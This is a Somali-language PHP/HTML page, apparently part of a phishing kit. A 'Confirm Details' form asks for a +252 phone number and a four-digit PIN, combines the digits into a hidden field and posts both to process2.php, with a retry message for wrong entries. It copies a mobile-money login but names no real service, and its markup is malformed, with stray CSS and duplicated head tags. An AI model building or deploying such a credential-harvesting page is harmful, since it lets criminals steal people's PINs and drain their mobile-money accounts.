<?php
if(isset($_GET['error'])){
    echo "<p style='color:red; text-align:center;'>Fadlan geli faahfaahintaada si sax ah ❌</p>";
}
?>

<!DOCTYPE html>
<html>
<head>

<title>Confirm Details</title>
<head>

<title>Confirm Details</title>

/* FULL PAGE BACKGROUND */
body {
    margin: 0;
    font-family: Arial, sans-serif;

    background: linear-gradient(135deg, #a8e063, #56ab2f);

    display: flex;
    justify-content: center;
    align-items: center;

    height: 100vh;
}

/* MAIN WHITE BOX */
.container {
    width: 90%;
    max-width: 400px;

    background: #fff;
    border-radius: 20px;

    padding: 25px;
    text-align: center;

    box-shadow: 0 5px 20px rgba(0,0,0,0.2);
}

/* PHONE INPUT */
.phone-box {
    display: flex;
    align-items: center;

    border: 2px solid #4CAF50;
    border-radius: 12px;

    padding: 10px;
    margin-bottom: 20px;
}

.phone-box span {
    margin-right: 10px;
}

.phone-box input {
    border: none;
    outline: none;
    width: 100%;
    font-size: 16px;
}

/* PIN BOXES */
.pin-box {
    display: flex;
    justify-content: center;
    gap: 12px;
    margin: 20px 0;
}

.pin {
    width: 55px;
    height: 55px;

    text-align: center;
    font-size: 22px;

    border: 2px solid #4CAF50;
    border-radius: 10px;
}

/* EYE ICON */
.pin-container {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
}

/* BUTTON */
button {
    width: 100%;
    padding: 15px;

    border: none;
    border-radius: 12px;

    background: #ccc;
    color: white;

    font-size: 16px;
    font-weight: bold;
}

</head>

</head>

<body>

<div class="container">

<h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>

<form action="process2.php" method="POST">

<div class="phone-box">
    <span>🇸🇴SO +252</span>
    <input type="tel" id="phone" name="phone" placeholder="699999999" maxlength="10" required>
</div>

<div class="pin-container">
    
    <div class="pin-box">
        <input type="password" maxlength="1" class="pin" required>
        <input type="password" maxlength="1" class="pin" required>
        <input type="password" maxlength="1" class="pin" required>
        <input type="password" maxlength="1" class="pin" required>
    </div>

    <span id="togglePin" style="cursor:pointer; font-size:20px;">👁</span>

</div>

<input type="hidden" name="pin" id="fullPin">

<button type="submit">SII WAD</button>

</form>

</div>
<script>
const pins = document.querySelectorAll(".pin");

// When typing in first box, allow full paste/typing
pins[0].addEventListener("input", function(e) {
    let value = this.value.replace(/\D/g, '');

    // If user types multiple digits
    if (value.length > 1) {
        value = value.slice(0, 4);
        pins.forEach((input, i) => {
            input.value = value[i] || "";
        });
        if (value.length === 4) pins[3].focus();
        return;
    }

    // Move to next
    if (this.value) pins[1].focus();
});

// Handle other boxes normally
pins.forEach((input, index) => {
    if(index === 0) return;

    input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, '');

        if (input.value && index < 3) {
            pins[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            pins[index - 1].focus();
        }
    });
});
</script>
<script>
let visible = false;

document.getElementById("togglePin").addEventListener("click", function() {
    visible = !visible;

    document.querySelectorAll(".pin").forEach(input => {
        input.type = visible ? "text" : "password";
    });

    this.textContent = visible ? "🙈" : "👁";
});
</script>
<script>
document.querySelector("form").addEventListener("submit", function() {

    let pin = "";

    document.querySelectorAll(".pin").forEach(input => {
        pin += input.value;
    });

    document.getElementById("fullPin").value = pin;

});
</script>


</body>
</html>